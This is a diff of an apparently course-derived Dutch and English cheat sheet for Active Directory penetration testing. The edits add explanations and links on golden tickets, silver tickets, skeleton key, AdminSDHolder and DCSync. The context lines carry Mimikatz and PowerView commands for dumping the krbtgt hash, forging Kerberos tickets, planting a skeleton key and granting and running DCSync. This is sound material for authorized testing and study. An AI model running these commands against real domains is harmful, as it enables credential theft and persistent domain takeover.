@@ -504,6 +504,8 @@ lsadump::sam SamBkup.hiv SystemBkup.hiv
 ## Golden ticket
 Golden tickets zijn nagemaakte TGT tickets. TGT tickets worden gebruikt om TGS tickets aan te vragen bij de KDC(DC). De kerberos Golden Ticket is een valid TGT omdat deze ondertekend is door het KRBTGT account. Als je de hash van de KRBTGT account kan achterhalen door de hashes te dumpen op de Domain controller en deze hash niet wijzigt is het mogelijk om weer een TGT aan te vragen bij de volgende penetratietest en volledige toegang tot het domein te verkrijgen.
 
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
+
 #### Dump hashes - Get the krbtgt hash
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
@@ -527,7 +529,11 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
 ```
 
 ## Silver ticket
-Interesting read: https://adsecurity.org/?p=2011
+Silver tickets zijn nagemaakte TGS tickets. Omdat de ticket is nagemaakt op de workstation is er geen communicatie met de DC. Eeen silver ticket kan worden aangemaakt met de service account hash of computer account hash.
+
+https://adsecurity.org/?p=2011
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets
+
 #### Make silver ticket for CIFS
 Use the hash of the local computer
 ```
@@ -540,8 +546,6 @@ ls \\<servername>\c$\
 ```
 
 #### Make silver ticket for Host
-Silver tickets zijn nagemaakte TGS tickets. Omdat de ticket is nagemaakt op de workstation is er geen communicatie met de DC. Eeen silver ticket kan worden aangemaakt met de service account hash of computer account hash.
-https://adsecurity.org/?p=2011
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
@@ -568,6 +572,8 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
 
 ## Skeleton key
 De skeleton key attack is een aanval dat malware in het geheugen laad van de domain controller. Waarna het mogelijk is om als elke user the authenticeren met een master wachtwoord. Als je dit met mimikatz uitvoert is dit wachwoord 'mimikatz'. Dit laad een grote security gat waarbij dit wordt uitgevoerd! Voer dit dus niet uit in een productieomgeving zonder goed te overleggen met de klant. Om deze aanval te stoppen moet de domain controller worden herstart.
+
+https://pentestlab.blog/2018/04/10/skeleton-key/
 
 #### Create the skeleton key - Requires DA
 ```
@@ -622,6 +628,8 @@ Invoke-Mimikatz -Command ‘”misc:memssp”’
 ### AdminSDHolder
 De AdminSDHolder container is een speciale AD container met default security permissies die gebruikt worden als template om beveiligde AD gebruikers en groepen (Domain Admins, Enterprise Admins etc.) te beveiligen en te voorkomen dat hier onbedoeld wijzingen aan worden uitgevoerd. Nadater er toegang is verkregen tot een DA is het mogelijk om deze container aan te passen voor persistence.
 
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence
+
 #### Check if student has replication rights
 ```
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
@@ -662,6 +670,11 @@ Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureSt
 ```
 
 ### DCsync
+Bij een DCSync aanval immiteren we een DC om de wachtwoorden te achterhalen via domain replication. Hiervoor hebben we bepaalde rechten nodig op de domain controller.
+
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
+https://blog.stealthbits.com/what-is-dcsync-an-introduction/
+
 #### Add full-control rights
 ```
 Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
@@ -672,7 +685,7 @@ Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’
 Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
 ```
 
-#### Execute DCSync
+#### Execute DCSync and dump krbtgt
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ```
